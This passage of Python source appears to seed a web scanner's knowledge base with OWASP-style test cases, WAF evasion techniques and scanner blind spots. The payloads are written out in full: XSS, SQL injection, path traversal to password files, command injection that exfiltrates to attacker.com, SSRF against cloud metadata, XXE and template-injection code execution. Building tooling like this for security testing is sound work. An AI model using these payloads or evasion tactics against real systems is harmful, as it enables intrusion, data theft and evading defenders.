            "category": "authentication",
            "test_steps": ["Complete first auth factor", "Skip MFA step by accessing protected resource directly", "Try old/reused MFA codes"],
            "payloads": ["Direct URL to post-MFA page", "Response manipulation (change 'mfa_required' to false)", "Brute force 4-6 digit codes"],
            "expected_vulnerable": "MFA can be skipped or brute-forced",
            "expected_secure": "MFA enforced server-side, rate-limited, codes expire",
        },
        {
            "test_id": "OTG-AUTHN-006",
            "name": "Username Enumeration",
            "category": "authentication",
            "test_steps": ["Try login with valid username", "Try login with invalid username", "Compare response time/message/size"],
            "payloads": ["Valid user with wrong password", "Invalid user with any password", "Forgot password with valid email", "Forgot password with invalid email"],
            "expected_vulnerable": "Different error messages or response times for valid vs invalid users",
            "expected_secure": "Generic error message, consistent response time",
        },
        # Authorization testing (5)
        {
            "test_id": "OTG-AUTHZ-001",
            "name": "Horizontal Privilege Escalation (IDOR)",
            "category": "authorization",
            "test_steps": ["Authenticate as user A", "Access user B resources by changing ID", "Check for data leakage"],
            "payloads": ["/api/users/2 (while logged in as user 1)", "/api/orders/OTHER_ID", "POST with modified user_id field"],
            "expected_vulnerable": "Can access other users' data by changing identifiers",
            "expected_secure": "Server validates resource ownership, returns 403",
        },
        {
            "test_id": "OTG-AUTHZ-002",
            "name": "Vertical Privilege Escalation",
            "category": "authorization",
            "test_steps": ["Authenticate as low-priv user", "Access admin endpoints", "Modify role parameters"],
            "payloads": ["/admin/dashboard with normal user token", "POST /api/users with role=admin", "PUT /api/user/1 with is_admin=true"],
            "expected_vulnerable": "Low-priv user can access admin functions or elevate role",
            "expected_secure": "Role-based access control enforced server-side",
        },
        {
            "test_id": "OTG-AUTHZ-003",
            "name": "Insecure Direct Object Reference via Path",
            "category": "authorization",
            "test_steps": ["Access file download endpoint", "Modify file path parameter", "Check for path traversal"],
            "payloads": ["/download?file=../../../etc/passwd", "/files/../../../../etc/shadow", "/export?doc=..\\..\\web.config"],
            "expected_vulnerable": "Can read arbitrary files outside intended directory",
            "expected_secure": "Path canonicalized and restricted to allowed directory",
        },
        {
            "test_id": "OTG-AUTHZ-004",
            "name": "Missing Function Level Access Control",
            "category": "authorization",
            "test_steps": ["Map all API endpoints from JS/docs", "Test each without authentication", "Test each with low-priv token"],
            "payloads": ["/api/admin/users (no auth)", "/api/internal/config (viewer token)", "DELETE /api/resource/1 (read-only user)"],
            "expected_vulnerable": "Admin functions accessible without proper authorization",
            "expected_secure": "Every endpoint checks authentication and authorization",
        },
        {
            "test_id": "OTG-AUTHZ-005",
            "name": "JWT Token Manipulation",
            "category": "authorization",
            "test_steps": ["Decode JWT token", "Modify claims (role, sub, exp)", "Try alg=none and HS256/RS256 confusion"],
            "payloads": ["alg: none", "Change role claim to admin", "Sign with empty key", "RS256 -> HS256 with public key as secret"],
            "expected_vulnerable": "Modified token accepted, alg=none works",
            "expected_secure": "Token signature verified with proper algorithm, claims validated",
        },
        # Session management (5)
        {
            "test_id": "OTG-SESS-001",
            "name": "Session Fixation",
            "category": "session",
            "test_steps": ["Obtain session ID before login", "Login with that session", "Check if session ID changes"],
            "payloads": ["Set-Cookie with known session ID", "URL parameter session ID", "Force session via form hidden field"],
            "expected_vulnerable": "Session ID remains the same after authentication",
            "expected_secure": "New session ID issued after successful login",
        },
        {
            "test_id": "OTG-SESS-002",
            "name": "Session Token Entropy",
            "category": "session",
            "test_steps": ["Collect 100+ session tokens", "Analyze randomness", "Check for patterns or predictability"],
            "payloads": [],
            "expected_vulnerable": "Tokens show patterns, sequential values, or low entropy",
            "expected_secure": "Cryptographically random tokens with 128+ bits entropy",
        },
        {
            "test_id": "OTG-SESS-003",
            "name": "Session Expiration Testing",
            "category": "session",
            "test_steps": ["Login and note session token", "Wait/idle for timeout period", "Try using old token", "Test logout invalidation"],
            "payloads": ["Reuse token after logout", "Reuse token after password change", "Use token after idle timeout"],
            "expected_vulnerable": "Old tokens remain valid after logout/timeout/password change",
            "expected_secure": "Tokens invalidated server-side on logout, timeout, and credential change",
        },
        {
            "test_id": "OTG-SESS-004",
            "name": "Cookie Security Attributes",
            "category": "session",
            "test_steps": ["Inspect Set-Cookie headers", "Check for Secure flag (HTTPS)", "Check HttpOnly and SameSite"],
            "payloads": [],
            "expected_vulnerable": "Session cookie missing Secure, HttpOnly, or SameSite attributes",
            "expected_secure": "Cookie: Secure; HttpOnly; SameSite=Strict (or Lax)",
        },
        {
            "test_id": "OTG-SESS-005",
            "name": "Concurrent Session Handling",
            "category": "session",
            "test_steps": ["Login from device A", "Login from device B", "Check if device A session is still valid"],
            "payloads": [],
            "expected_vulnerable": "Unlimited concurrent sessions allowed with no notification",
            "expected_secure": "Previous sessions invalidated or user notified of concurrent login",
        },
        # Input validation (6)
        {
            "test_id": "OTG-INPVAL-001",
            "name": "Reflected XSS Testing",
            "category": "input_validation",
            "test_steps": ["Find input reflected in response", "Test HTML context escaping", "Test attribute context", "Test JS context"],
            "payloads": [
                "<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)", "<svg onload=alert(1)>", "<details/open/ontoggle=alert(1)>",
                "'-alert(1)-'", "\";alert(1)//",
            ],
            "expected_vulnerable": "Payload executes in browser without encoding",
            "expected_secure": "All output HTML-encoded, CSP blocks inline scripts",
        },
        {
            "test_id": "OTG-INPVAL-002",
            "name": "SQL Injection Testing",
            "category": "input_validation",
            "test_steps": ["Find data-driven parameters", "Test string/numeric contexts", "Test UNION/blind/error-based"],
            "payloads": [
                "' OR 1=1--", "1 OR 1=1", "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--", "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            "expected_vulnerable": "Database error exposed or time delay observed",
            "expected_secure": "Parameterized queries, no error details exposed",
        },
        {
            "test_id": "OTG-INPVAL-003",
            "name": "Command Injection Testing",
            "category": "input_validation",
            "test_steps": ["Find OS command parameters", "Test command separators", "Test out-of-band"],
            "payloads": [
                "; id", "| id", "$(id)", "`id`", "|| id",
                "& ping -c 3 attacker.com", "; curl http://attacker.com/$(whoami)",
                "\n/bin/cat /etc/passwd", "| nslookup attacker.com",
            ],
            "expected_vulnerable": "Command output visible or time delay/DNS lookup observed",
            "expected_secure": "No shell invocation, whitelist-based input validation",
        },
        {
            "test_id": "OTG-INPVAL-004",
            "name": "Server-Side Request Forgery (SSRF)",
            "category": "input_validation",
            "test_steps": ["Find URL/file fetch parameters", "Test internal IPs", "Test cloud metadata", "Test protocol smuggling"],
            "payloads": [
                "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
                "http://[::1]", "http://0x7f000001", "http://localhost:22",
                "http://internal-service:8080", "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO",
            ],
            "expected_vulnerable": "Internal service response or metadata returned",
            "expected_secure": "URL validation, allowlist of external domains, no internal access",
        },
        {
            "test_id": "OTG-INPVAL-005",
            "name": "XML External Entity (XXE) Injection",
            "category": "input_validation",
            "test_steps": ["Find XML input endpoints", "Inject external entity", "Test blind XXE via OOB"],
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>bar</foo>',
            ],
            "expected_vulnerable": "File contents returned or OOB callback received",
            "expected_secure": "External entities disabled, DTD processing disabled",
        },
        {
            "test_id": "OTG-INPVAL-006",
            "name": "Server-Side Template Injection (SSTI)",
            "category": "input_validation",
            "test_steps": ["Find template-rendered input", "Test math expressions", "Test engine-specific payloads"],
            "payloads": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                "{{config}}", "{{self.__class__.__mro__}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{% import os %}{{ os.popen('id').read() }}",
            ],
            "expected_vulnerable": "Expression evaluated (49 returned) or code executed",
            "expected_secure": "Template input sandboxed or not user-controllable",
        },
        # Error handling (4)
        {
            "test_id": "OTG-ERR-001",
            "name": "Stack Trace Information Disclosure",
            "category": "error_handling",
            "test_steps": ["Trigger application errors", "Check for stack traces", "Look for version/path info"],
            "payloads": ["/nonexistent", "/api/user/'", "/api/user/-1", "/?id[]=1"],
            "expected_vulnerable": "Full stack trace with file paths, versions, and frameworks exposed",
            "expected_secure": "Generic error page, details logged server-side only",
        },
        {
            "test_id": "OTG-ERR-002",
            "name": "Verbose Error Messages",
            "category": "error_handling",
            "test_steps": ["Submit malformed input to all parameters", "Check error messages for internal details", "Test different content types"],
            "payloads": ["Invalid JSON body", "Wrong content-type", "Oversized input", "Null bytes in parameters"],
            "expected_vulnerable": "Error messages reveal database type, query, internal paths, or library versions",
            "expected_secure": "Consistent generic error response regardless of error type",
        },
        {
            "test_id": "OTG-ERR-003",
            "name": "Debug Mode Detection",
            "category": "error_handling",
            "test_steps": ["Check for debug pages", "Look for development/debug cookies", "Test debug parameters"],
            "payloads": ["?debug=true", "?debug=1", "Cookie: debug=1", "X-Debug: 1", "?_debug=1"],
            "expected_vulnerable": "Debug information exposed via parameter or cookie toggle",
            "expected_secure": "Debug mode disabled in production, no debug toggles",
        },
        {
            "test_id": "OTG-ERR-004",
            "name": "Custom Error Page Bypass",
            "category": "error_handling",
            "test_steps": ["Request various error codes", "Check if custom pages leak info", "Test Accept header variations"],
            "payloads": ["Accept: application/json (on HTML error page)", "Accept: text/xml", "Accept: */* with .json extension"],
            "expected_vulnerable": "JSON/XML error response reveals more details than HTML version",
            "expected_secure": "Consistent sanitized error response across all content types",
        },
        # Cryptography (5)
        {
            "test_id": "OTG-CRYPST-001",
            "name": "Weak TLS Configuration",
            "category": "cryptography",
            "test_steps": ["Check TLS version support", "Test cipher suites", "Check certificate validity"],
            "payloads": [],
            "expected_vulnerable": "SSLv3/TLS1.0 enabled, weak ciphers (RC4, DES, NULL), self-signed cert",
            "expected_secure": "TLS 1.2+ only, strong ciphers (AES-GCM, ChaCha20), valid certificate",
        },
        {
            "test_id": "OTG-CRYPST-002",
            "name": "Sensitive Data in Transit",
            "category": "cryptography",
            "test_steps": ["Check for HTTP endpoints", "Test HSTS header", "Check for mixed content"],
            "payloads": ["http:// version of all https:// URLs"],
            "expected_vulnerable": "Login/API available over HTTP, no HSTS, no redirect to HTTPS",
            "expected_secure": "HTTPS enforced, HSTS with long max-age, HTTP->HTTPS redirect",
        },
        {
            "test_id": "OTG-CRYPST-003",
            "name": "Weak Password Hashing",
            "category": "cryptography",
            "test_steps": ["Examine password storage (if source available)", "Check for hash in responses", "Test password comparison timing"],
            "payloads": ["Register and check stored hash format", "Timing analysis on login"],
            "expected_vulnerable": "MD5/SHA1 without salt, plaintext storage, fast hashing",
            "expected_secure": "bcrypt/scrypt/argon2 with per-user salt, constant-time comparison",
        },
        {
            "test_id": "OTG-CRYPST-004",
            "name": "Insecure Randomness",
            "category": "cryptography",
            "test_steps": ["Collect tokens/IDs", "Analyze for patterns", "Check reset tokens and API keys"],
            "payloads": [],
            "expected_vulnerable": "Sequential IDs, timestamp-based tokens, predictable random seed",
            "expected_secure": "CSPRNG-generated tokens, UUIDs v4, no pattern in token sequence",
        },
        {
            "test_id": "OTG-CRYPST-005",
            "name": "Padding Oracle Attack",
            "category": "cryptography",
            "test_steps": ["Find encrypted parameters (cookies, tokens)", "Modify ciphertext bytes", "Analyze error differences"],
            "payloads": ["Flip bits in ciphertext", "Truncate ciphertext", "Append bytes to ciphertext"],
            "expected_vulnerable": "Different errors for invalid padding vs invalid data (oracle)",
            "expected_secure": "Authenticated encryption (AES-GCM), generic error for all decrypt failures",
        },
    ]

    return [
        {
            "pattern_type": "owasp_test",
            "technology": None,
            "vuln_type": t["category"],
            "pattern_data": {
                "key": t["test_id"],
                "test_id": t["test_id"],
                "name": t["name"],
                "category": t["category"],
                "test_steps": t["test_steps"],
                "payloads": t["payloads"],
                "expected_vulnerable": t["expected_vulnerable"],
                "expected_secure": t["expected_secure"],
            },
            "confidence": 0.95,
            "sample_count": 500,
        }
        for t in tests
    ]


# ===================================================================
# A. Scanner Evasion Techniques (20+)
# ===================================================================

def _scanner_evasion_techniques() -> list[dict]:
    techniques = [
        {
            "technique": "User-Agent Filtering",
            "detection": "Server returns different content based on User-Agent string",
            "countermeasure": "Rotate User-Agents, use browser-like UAs, compare responses across different UAs",
            "description": "WAFs and apps detect scanner User-Agents (Nmap, Nikto, sqlmap, Burp) and return clean responses",
        },
        {
            "technique": "Rate Limiting / Throttling",
            "detection": "HTTP 429 responses, increasing delays, connection drops after N requests",
            "countermeasure": "Adaptive request pacing, distribute across time, use stealth scan profile",
            "description": "Rate limiting blocks scanners making rapid sequential requests",
        },
        {
            "technique": "CAPTCHA / JS Challenge",
            "detection": "Response contains CAPTCHA or JavaScript challenge before actual content",
            "countermeasure": "Use headless browser (Playwright), detect challenge pages before processing",
            "description": "Cloudflare, Akamai, etc. serve JS challenges that block non-browser clients",
        },
        {
            "technique": "Honeypot Endpoints",
            "detection": "Hidden links in HTML (display:none, off-screen) that only scanners follow",
            "countermeasure": "Respect robots.txt nofollow, check CSS visibility before crawling links",
            "description": "Fake vulnerable endpoints planted to detect and fingerprint scanners",
        },
        {
            "technique": "Dynamic Content Rendering",
            "detection": "Empty or minimal HTML returned to non-JS clients, content rendered client-side",
            "countermeasure": "Use Playwright headless browser, wait for DOM stabilization, check for SPAs",
            "description": "Single Page Applications render content via JavaScript, invisible to HTTP-only scanners",
        },
        {
            "technique": "Session-Bound Path Randomization",
            "detection": "URLs contain per-session tokens that change on each visit",
            "countermeasure": "Maintain session state, extract and track CSRF tokens, use cookie jars",
            "description": "Anti-CSRF tokens in URLs make path enumeration ineffective without valid session",
        },
        {
            "technique": "Sequential Parameter Detection",
            "detection": "Server detects automated sequential parameter testing (id=1,2,3,4...)",
            "countermeasure": "Randomize parameter order, add jitter between requests, use realistic values",
            "description": "WAFs detect brute-force IDOR testing by monitoring sequential parameter patterns",
        },
        {
            "technique": "IP Reputation Blocking",
            "detection": "Requests blocked based on source IP reputation (known scanner/VPN/Tor IPs)",
            "countermeasure": "Use residential proxies, cloud provider IPs, or target-approved source IPs",
            "description": "Services like Cloudflare block requests from known bad IP ranges",
        },
        {
            "technique": "TLS Fingerprinting (JA3)",
            "detection": "Server identifies client by TLS handshake fingerprint (JA3 hash)",
            "countermeasure": "Use browser-like TLS stack (curl-impersonate), rotate JA3 fingerprints",
            "description": "JA3/JA3S fingerprinting identifies Python/Go HTTP libraries vs real browsers",
        },
        {
            "technique": "HTTP/2 Fingerprinting",
            "detection": "Server analyzes HTTP/2 settings frame, priority, and window update patterns",
            "countermeasure": "Use HTTP/2-aware clients that mimic browser fingerprints",
            "description": "HTTP/2 fingerprinting (Akamai) distinguishes scanners from browsers by protocol behavior",
        },
        {
            "technique": "Header Order Analysis",
            "detection": "Server checks HTTP header ordering which differs between browsers and libraries",
            "countermeasure": "Send headers in browser-typical order (Host, User-Agent, Accept, etc.)",
            "description": "Real browsers send headers in consistent order; libraries often differ",
        },
        {
            "technique": "Cookie Jar Evasion",
            "detection": "Server sets tracking cookies and blocks clients that do not return them",
            "countermeasure": "Maintain full cookie jar, handle Set-Cookie responses, respect cookie scope",
            "description": "Multi-step cookie chains verify clients maintain state like browsers",
        },
        {
            "technique": "Behavioral Analysis",
            "detection": "Server monitors navigation patterns (no images/CSS loaded, no Referer headers)",
            "countermeasure": "Load sub-resources, set Referer, simulate realistic browsing patterns",
            "description": "Advanced WAFs detect scanner behavior (no resource loading, linear path traversal)",
        },
        {
            "technique": "Content Variation",
            "detection": "Server returns slightly different content on each request (random tokens, timestamps)",
            "countermeasure": "Normalize responses before comparison, ignore dynamic tokens",
            "description": "Dynamic content makes signature-based vulnerability detection unreliable",
        },
        {
            "technique": "Geographic Blocking",
            "detection": "Requests blocked based on source IP geolocation",
            "countermeasure": "Use proxies in the target's expected geographic region",
            "description": "Geo-blocking restricts access to specific countries or regions",
        },
        {
            "technique": "Tar Pit / Slow Response",
            "detection": "Server intentionally slows responses to detected scanners",
            "countermeasure": "Set reasonable timeouts, detect abnormally slow responses, flag as evasion",
            "description": "Tar pits waste scanner time by sending data extremely slowly",
        },
        {
            "technique": "Client Certificate Requirement",
            "detection": "Server requires mutual TLS (mTLS) authentication",
            "countermeasure": "Check for TLS handshake failures indicating client cert requirement",
            "description": "mTLS blocks all unauthorized clients regardless of application-layer credentials",
        },
        {
            "technique": "WebSocket Protocol Switching",
            "detection": "Critical functionality only available via WebSocket, not HTTP",
            "countermeasure": "Include WebSocket scanning capability, test ws:// and wss:// endpoints",
            "description": "Moving functionality to WebSockets evades HTTP-only scanners",
        },
        {
            "technique": "API Versioning Evasion",
            "detection": "Vulnerable functionality only in specific API version not in docs",
            "countermeasure": "Test all discovered API versions (v1, v2, v3, internal), check for undocumented versions",
            "description": "Undocumented or legacy API versions may have vulnerabilities not in current version",
        },
        {
            "technique": "Response Splitting / Chunked Encoding",
            "detection": "Server uses chunked transfer encoding to break up signatures scanners look for",
            "countermeasure": "Reassemble full response before analysis, handle all transfer encodings",
            "description": "Chunked encoding can split vulnerability indicators across chunks",
        },
        {
            "technique": "Login Flow Complexity",
            "detection": "Multi-step login with device fingerprinting, OTP, biometric requirements",
            "countermeasure": "Script full login flow, handle MFA tokens programmatically",
            "description": "Complex auth flows prevent scanners from testing authenticated areas",
        },
        {
            "technique": "Request Signing / HMAC",
            "detection": "API requires signed requests with timestamp and HMAC",
            "countermeasure": "Extract signing logic from JavaScript, implement request signing in scanner",
            "description": "Request signing blocks replay and modification of requests by scanners",
        },
    ]

    return [
        {
            "pattern_type": "scanner_evasion",
            "technology": None,
            "vuln_type": None,
            "pattern_data": {
                "key": f"evasion_{t['technique'].lower().replace(' ', '_').replace('/', '_')[:40]}",
                "technique": t["technique"],
                "detection": t["detection"],
                "countermeasure": t["countermeasure"],
                "description": t["description"],
            },
            "confidence": 0.9,
            "sample_count": 100,
        }
        for t in techniques
    ]


# ===================================================================
# B. Scanner Blind Spots (15+)
# ===================================================================

def _scanner_blind_spots() -> list[dict]:
    blind_spots = [
        {
            "blindspot": "Business Logic Flaws",
            "why_missed": "Scanners test technical vulnerabilities, not application-specific business rules",
            "manual_test": "Test price manipulation, coupon stacking, negative quantities, loyalty point abuse, workflow bypass",
            "automated_detection": "Compare price calculations server-side vs client-side, test boundary values on business fields",
            "severity_potential": "critical",
        },
        {
            "blindspot": "Multi-Step Vulnerabilities",
            "why_missed": "Scanners test individual endpoints, not sequences of dependent requests",
            "manual_test": "Map state machines, test step skipping, test out-of-order execution",
            "automated_detection": "Build state-aware scanning with request chains, test skipping intermediate steps",
            "severity_potential": "high",
        },
        {
            "blindspot": "Time-Based Race Conditions",
            "why_missed": "Require precisely timed concurrent requests that scanners rarely send",
            "manual_test": "Send parallel requests for balance transfer, coupon redemption, vote submission",
            "automated_detection": "Send N concurrent identical requests (race window), check for double-processing",
            "severity_potential": "high",
        },
        {
            "blindspot": "Stored XSS",
            "why_missed": "Payload injected on one endpoint but triggers on a different page/context",
            "manual_test": "Inject payload in profile/comment, check admin panel, email notifications, PDF exports",
            "automated_detection": "Track injected unique markers across all pages, correlate input->output endpoints",
            "severity_potential": "high",
        },
        {
            "blindspot": "Second-Order SQL Injection",
            "why_missed": "Payload stored safely but used unsafely in a later query (e.g., username in admin lookup)",
            "manual_test": "Register with SQLi payload in username, trigger admin user listing or report generation",
            "automated_detection": "Track stored values, monitor for SQL errors on unrelated endpoints after injection",
            "severity_potential": "critical",
        },
        {
            "blindspot": "Chained SSRF (Internal to Internal)",
            "why_missed": "First SSRF reaches internal service, second SSRF from that service reaches deeper network",
            "manual_test": "Map internal service topology, chain SSRF through multiple internal services",
            "automated_detection": "Test SSRF with internal URLs that themselves have SSRF-prone parameters",
            "severity_potential": "critical",
        },
        {
            "blindspot": "Authentication State Bugs",
            "why_missed": "Bugs in session state transitions (login -> MFA -> verified) not tested by standard scanning",
            "manual_test": "Test parallel sessions, session state after password change, partial authentication states",
            "automated_detection": "Maintain multiple session states, test each endpoint with each auth state",
            "severity_potential": "high",
        },
        {
            "blindspot": "Mobile API-Only Endpoints",
            "why_missed": "API endpoints only used by mobile apps not discoverable via web crawling",
            "manual_test": "Decompile mobile app, proxy mobile traffic, find undocumented API endpoints",
            "automated_detection": "Check for /api/mobile/, /api/app/, mobile-specific headers (X-App-Version)",
            "severity_potential": "high",
        },
        {
            "blindspot": "WebSocket Vulnerabilities",
            "why_missed": "Most scanners only test HTTP, not WebSocket protocol messages",
            "manual_test": "Intercept WebSocket frames, inject XSS/SQLi in WS messages, test auth on WS connections",
            "automated_detection": "Upgrade to WebSocket, fuzz message frames, test cross-site WebSocket hijacking",
            "severity_potential": "high",
        },
        {
            "blindspot": "Server-Side Cache Poisoning",
            "why_missed": "Requires understanding of caching layers and cache key composition",
            "manual_test": "Test unkeyed headers/params that affect response (X-Forwarded-Host, X-Original-URL)",
            "automated_detection": "Send requests with cache-busting param + poison headers, check if cached response reflects poison",
            "severity_potential": "high",
        },
        {
            "blindspot": "Email Header Injection",
            "why_missed": "Scanners don't typically receive or analyze outbound emails",
            "manual_test": "Inject \\r\\n in email fields (To, Subject, CC), check for additional headers/recipients",
            "automated_detection": "Test email-related inputs with CRLF injection, use OOB email receiver to detect injection",
            "severity_potential": "medium",
        },
        {
            "blindspot": "PDF/Image Processing Vulnerabilities",
            "why_missed": "Require file upload with crafted content targeting specific libraries (ImageMagick, Ghostscript)",
            "manual_test": "Upload crafted SVG (SSRF), polyglot PDF (XSS), ImageMagick payload (RCE)",
            "automated_detection": "Upload known-bad test files for common processors, monitor for SSRF callbacks or errors",
            "severity_potential": "critical",
        },
        {
            "blindspot": "GraphQL-Specific Vulnerabilities",
            "why_missed": "Scanners treat GraphQL as REST, missing batching, introspection, deep nesting attacks",
            "manual_test": "Test query batching for brute force, nested query DoS, field suggestion enumeration",
            "automated_detection": "Send introspection query, generate tests for all types/fields, test query depth limits",
            "severity_potential": "high",
        },
        {
            "blindspot": "Subdomain Takeover",
            "why_missed": "Requires DNS analysis + cloud service enumeration, not just HTTP testing",
            "manual_test": "Enumerate subdomains, check for dangling CNAME/A records pointing to unclaimed services",
            "automated_detection": "Resolve all subdomains, check for cloud provider error pages (S3, Azure, Heroku, GitHub Pages)",
            "severity_potential": "high",
        },
        {
            "blindspot": "Prototype Pollution (JavaScript)",
            "why_missed": "Requires understanding of JS object prototype chain, not detectable via HTTP responses alone",
            "manual_test": "Test __proto__, constructor.prototype in JSON input, check for behavior changes",
            "automated_detection": "Inject __proto__ payloads in JSON parameters, check for reflected prototype properties",
            "severity_potential": "high",
        },
        {
            "blindspot": "Mass Assignment / Parameter Binding",
            "why_missed": "Scanners send known parameters, miss hidden model attributes accepting extra fields",
            "manual_test": "Add extra fields to POST/PUT requests (role, is_admin, price, balance, verified)",
            "automated_detection": "Enumerate model fields from API docs/errors, test adding each as extra parameter",
            "severity_potential": "high",
        },
        {
            "blindspot": "Insecure Deserialization",
            "why_missed": "Requires knowledge of serialization format (Java, PHP, Python pickle, .NET) and crafted gadget chains",
            "manual_test": "Identify serialized data (base64 cookies, viewstate), inject deserialization payloads",
            "automated_detection": "Detect serialization markers (rO0AB for Java, O: for PHP), test with known gadget payloads",
            "severity_potential": "critical",
        },
        {
            "blindspot": "DNS Rebinding",
            "why_missed": "Requires attacker-controlled DNS server with short TTL, complex setup",
            "manual_test": "Set up DNS rebinding domain, access internal services through browser DNS cache",
            "automated_detection": "Check for Host header validation, test with DNS rebinding service domains",
            "severity_potential": "high",
        },
    ]

    return [
        {
            "pattern_type": "scanner_blindspot",
            "technology": None,
            "vuln_type": None,
            "pattern_data": {
                "key": f"blindspot_{b['blindspot'].lower().replace(' ', '_').replace('/', '_')[:40]}",
                "blindspot": b["blindspot"],
                "why_missed": b["why_missed"],
                "manual_test": b["manual_test"],
                "automated_detection": b["automated_detection"],
                "severity_potential": b["severity_potential"],
            },
            "confidence": 0.85,
            "sample_count": 50,
        }
        for b in blind_spots
    ]
